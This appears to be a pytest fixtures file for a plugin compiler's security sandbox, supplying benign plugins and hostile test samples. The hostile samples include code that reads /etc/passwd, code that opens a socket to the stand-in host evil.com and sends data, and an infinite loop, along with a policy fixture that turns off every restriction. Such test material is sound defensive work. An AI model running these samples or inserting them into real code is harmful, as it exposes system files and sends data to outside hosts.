import pytest
from backend.compiler.config import CompileConfig, SecurityPolicy

@pytest.fixture
def simple_plugin_source():
    return """
def main(data):
    return {"status": "ok", "message": "hello world"}
"""

@pytest.fixture
def calculator_plugin_source():
    return """
def add(a, b):
    return a + b

def main(data):
    a = data.get('a', 0)
    b = data.get('b', 0)
    return {"result": add(a, b)}
"""

@pytest.fixture
def malicious_filesystem_source():
    return """
def main(data):
    with open('/etc/passwd') as f:
        return f.read()
"""

@pytest.fixture
def malicious_network_source():
    return """
import socket
def main(data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("evil.com", 80))
    s.send(b"data")
"""

@pytest.fixture
def infinite_loop_source():
    return """
def main(data):
    while True:
        pass
"""

@pytest.fixture
def host_function_source():
    return """
def main(data):
    host.log('hello')
    return {'ok': True}
"""

@pytest.fixture
def default_config():
    return CompileConfig()

@pytest.fixture
def default_policy():
    return SecurityPolicy()

@pytest.fixture
def permissive_policy():
    return SecurityPolicy(
        forbidden_modules=frozenset(),
        forbidden_builtins=frozenset(),
        forbidden_attributes=frozenset(),
        allow_eval=True,
        allow_exec=True,
        allow_compile=True,
        allow_file_io=True,
        allow_network=True,
        allow_subprocess=True,
        allow_dynamic_imports=True,
        allow_star_imports=True,
        allow_dunder_access=True,
        allow_global_statement=True,
    )
